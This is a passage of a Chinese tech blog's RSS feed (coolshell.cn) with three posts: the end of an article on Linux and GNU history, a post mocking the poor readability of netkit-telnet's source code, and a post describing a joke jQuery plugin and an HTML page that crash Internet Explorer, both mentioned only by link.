<p>从一开始，Linus就决定自由扩散Linux，包括原代码，随即Linux引起黑客们（hacker）的注意，通过计算机网络加入了Linux的内核开发。Linux倾向于成为一个黑客的系统——直到今天，在Linux社区里内核的开发被认为是真正的编程。由于一批高水平黑客的加入，使Linux 发展迅猛，几乎一两个礼拜就有新版或修正版的出现，到1993年底94年初，Linux 1.0终于诞生了！Linux 1.0已经是一个功能完备的操作系统，而且内核写得紧凑高效，可以充分发挥硬件的性能，在4M内存的80386机器上也表现得非常好，至今人们还在津津乐道。时至今日，kernel的版本已经出到2.6。Linux的发展不像传统的软件工程，它完全是透过网络，集合世界各地的高手而成的一套操作系统，在这里我们也可以见识到网络快速传播的威力。Linux初次让整个世界感觉到了开源力量和网络力量的如此强大。（Linux 的标志和吉祥物是一只名字叫做 Tux 的 企鹅，标志的由来是因为Linus在澳洲时曾被一只动物园里的企鹅咬了一口，便选择了企鹅作为Linux的标志。）</p>
<p>Linux 的历史是和GNU紧密联系在一起的。从1983年开始的GNU计划致力于开发一个自由并且完整的类Unix操作系统，包括软件开发工具和各种应用程序。到1991年 Linux 内核发布的时候，GNU已经几乎完成了除了系统内核之外的各种必备软件的开发。在 Linus Torvalds 和其它开发人员的努力下，GNU组件可以运行于Linux内核之上。整个内核是基于 GNU 通用公共许可，也就是GPL（GNU General Public License，GNU通用公共许可证）的，但是Linux内核并不是GNU 计划的一部分。1994年3月，Linux1.0版正式发布，Marc Ewing成立了 Red Hat 软件公司，成为最著名的 Linux 分销商之一。</p>
<p>严格来讲，Linux这个词本身只表示Linux内核，但在实际上人们已经习惯了用Linux来形容整个基于Linux内核，并且使用GNU 工程各种工具和应用程序的操作系统(也被称为GNU/Linux)。基于这些组件的Linux软件被称为Linux发行版。一般来讲，一个Linux发行套件包含大量的软件，比如软件开发工具，数据库，Web服务器（例如Apache)，X Window，桌面环境（比如GNOME和KDE），办公套件（比如OpenOffice.org），等等。</p>
<p>1991至1995年间，Linux从概念型的0.1版本内核原型，发展成为能够在性能和特性上均堪媲美专有Unix的操作系统，并且在连续正常工作时间等重要统计数据上打败了这些Unix中的绝大部分。1995年，Linux找到了自己的杀手级应用——开源的web服务器Apache。就像Linux，Apache出众地稳定和高效。很快，运行Apache的Linux机器成了全球ISP平台的首选。约60%的网站选用Apache，轻松击败了另两个主要的专有型竞争对手。今天的LAMP（Linux , Apache, MySQL, PHP）已经成为了架构Web服务器的主要首选。</p>
<p> 现如今的Linux不但可以装在几乎所有的主流服务器上，当然也包括桌面的X86系统中。其还常常被用于嵌入式系统，机顶盒、手机、交换机、游戏机、PDA、网络交换机、路由器、等等，都是因为Linux那精彩的内核。</p>
<p>Linux的出现，不仅仅给世界带来了一个免费的操作系统，也不仅仅是对Unix自由、共享的文化的延续，它的出现带给了计算机世界自Unix、GNU以来更为成熟的思想和文化。</p>
<h3>Linux今天的领袖</h3>
<p><strong> </strong></p>
<p>Linux和GNU关系是比较微妙的。那时，自由软件基金会编写的用户软件工具包铺平了一条摆脱高成本专有软件开发工具的前进道路。意识服从经济，而不是领导：一些新手加入了RMS的革命运动，高举GPL大旗，另一些人则更认同整体意义上的Unix传统，加入了反对GPL的阵营，但其他大部分人置身事外，一心编码。</p>
<p>Linus Torvalds巧妙地跨越了GPL和反GPL的派别之争。他利用GNU工具包搭起了自创的Linux内核，用GPL的传染性质保护它，但拒绝认同Richard Stallman的许可协议反映的思想体系计划。Linus Torvalds明确表示他认为自由软件一般情况下更好，但他偶尔也用专有软件。即使在他自己的事业中，他也拒绝成为狂热分子。这一点极大地吸引了大多数黑客，他们虽然早就反感Richard Stallman的言辞，但他们的怀疑论一直缺个有影响力或者令人信服的代言人。而Linus Torvalds正好充当了这一角色。</p>
<p> <img alt="image placeholder" >Linus Torvalds令人愉快的实用主义及灵活而低调的行事风格，促使黑客文化在1993至1997年间取得了一连串令人惊奇的胜利，不仅仅在技术上的成功，还让围绕Linux操作系统的发行、服务和支持产业有了坚实的开端。结果，他的名望和影响也一飞冲天。Torvalds成为了互联网时代的英雄；到1995年为止，他只用了四年时间就在整个黑客文化界声名显赫，而Richard Stallman为此花了十五年，而且他还远远超过了Stallman向外界贩卖“自由软件”的记录。与Torvalds相比，Richard Stallman的言辞渐渐显得既刺耳又无力。（参看《<a rel="bookmark" href="https://coolshell.cn/articles/1278.html" target="_blank">Linus Torvalds 语录 Top 10</a>》）</p>
<p>今天，我们也说不清楚是GNU Linux还是Linux GNU。Linux既不排斥开源，也不排斥商业化，Linus认为好的软件是需要免费和商业化共同推进的。正是这种革命性的想法，造就了今天的Linux火红的局面（参看《<a rel="bookmark" href="https://coolshell.cn/articles/1360.html" target="_blank">谁写了Linux</a>》、《<a rel="bookmark" href="https://coolshell.cn/articles/1283.html" target="_blank">Linux基金会的广告</a>》、《<a rel="bookmark" href="https://coolshell.cn/articles/85.html" target="_blank">Linux Distribution Timeline</a>》）。Linux就像一股清泉流入了所有人的心中，引发了很多的启迪和思考。</p>
<p><a href="https://coolshell.cn/articles/2324.html" target="_blank"><strong>Unix传奇（下篇） &gt;&gt;&gt;&gt;</strong></a></p>
<h2>
<strong>(</strong><strong>转载时请注明作者和出处。未经许可，请勿用于商业用途</strong><strong>)</strong>
</h2>
<p></p>
 ]]></content>
<pubDate>2010-04-09T08:45:27+08:00</pubDate>
<guid>https://coolshell.cn/articles/2322.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ telnet的一个Bug ]]></title>
<link>https://coolshell.cn/articles/2352.html</link>
<content><![CDATA[ 
<p>下面这个链接是Linux分发包Ubuntu的关于Telnet命令的Man Page，</p>
<p style="text-align: center;"><a href="https://manpages.ubuntu.com/manpages/karmic/man1/telnet-ssl.1.html" target="_blank">http://manpages.ubuntu.com/manpages/karmic/man1/telnet-ssl.1.html</a></p>
<p style="text-align: left;">打开这个Man Page，把页面拉到最后一行，你会看到下面这个BUG（“BUGS：源代码不易读！”）</p>
<pre>     The source code is not comprehensible.</pre>
<p>Telnet的源代码在这里：<a href="https://packages.ubuntu.com/source/dapper/netkit-telnet" target="_blank">http://packages.ubuntu.com/source/dapper/netkit-telnet</a>，下载下来一看，还真是不易读，简单地看了一下代码，发现至少有这样一些问题：</p>
<ul>
<li>空格和Tab键混用的缩进，导致很多代码在没有缩进。</li>
<li>大量的#if #else以及大量的各种预编译宏。以及一些怪异的宏。如：</li>
</ul>
<p style="padding-left: 60px;">#ifndef B19200<br>
#define B19200 B9600<br>
#endif</p>
<p style="padding-left: 60px;">#ifndef B38400<br>
#define B38400 B19200<br>
#endif</p>
<ul>
<li>什么叫在C中写C++，第一次见。（在terminal.cc中间居然出现了几个class）</li>
<li>变量命名很不直观，大量的old, tmp, c1, c2, s1, s2, s3 等学校里用的变量名，只有作者自己知道是什么意思。函数命令的风格也不一致，编程风格也很不一致，基本没有编程规范。</li>
</ul>
<p>的确很不易读。不管怎么样，很欣赏在man page中把源码的易读性列为BUG的这种作法。</p>
 ]]></content>
<pubDate>2010-04-14T09:10:20+08:00</pubDate>
<guid>https://coolshell.cn/articles/2352.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一个jQuery的插件 ]]></title>
<link>https://coolshell.cn/articles/2357.html</link>
<content><![CDATA[ 
<p>jQuery这个强大的玩意我就不多说了，不知道可以上网搜搜看。IE6我也不多说了，这可能是史上骂名最多的一个浏览器，网上有N多的声讨IE6的文章，你也可以参看本站的《<a rel="bookmark" href="https://coolshell.cn/articles/1817.html">9个最常见IE的Bug及其fix</a>》和《<a rel="bookmark" href="https://coolshell.cn/articles/1245.html">IE的CSS相关的BUG</a>》，如果你今天还在用IE6，或是IE类浏览器，那请让我小小的BS你一下。</p>
<p>这个jQuery的Plugin可能是有史以来所有plugin中最有个性的一个，因为这个plugin什么也不干，其会用户的IE6版的浏览器直接Crash掉。这个plugin叫jQuery Crash，其网页链接在下面，是一个四星级的插件，仅仅435个字节。</p>
<p style="text-align: center;"><a href="https://plugins.jquery.com/project/crash" target="_blank">http://plugins.jquery.com/project/crash</a></p>
<p style="text-align: left;">其是这样介绍自己的，有脏话，我就不翻译了。</p>
<blockquote><p>A jQuery plugin for crashing IE6. That’ll teach those motherf!%@*#s to upgrade their s#*t.</p></blockquote>
<p>其它，让IE系例的浏览器挂掉，并不需要Javascript，你可以尝试点击下面这个页面，这是一个纯HTML的页面，没有任何的CSS，或是JS的东西，只有HTML。请小心打开（如果在Firefox中打开也可能会挂，Chrome中没事）</p>
<p style="text-align: center;"><a href="http://www.gregmerideth.net/html/iecrash.html" target="_blank">http://www.gregmerideth.net/html/iecrash.html</a></p>
<p>这个纯HTML的来源是本来是作者写了一个程序生成了一个N层嵌套的表格，结果在IE5中导致了IE5不响应直到Crash并使用了100%的CPU资源，这么多年过去了，还是老样子，在我的dual-core+IE7上，也是一样，占了50%的CPU，而且还有很高的内核使用，最后只能把进程给kill了。BT啊，纯HTML都会让IE这样。</p>
 ]]></content>
<pubDate>2010-04-14T13:42:36+08:00</pubDate>
<guid>https://coolshell.cn/articles/2357.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
</channel>
</rss>
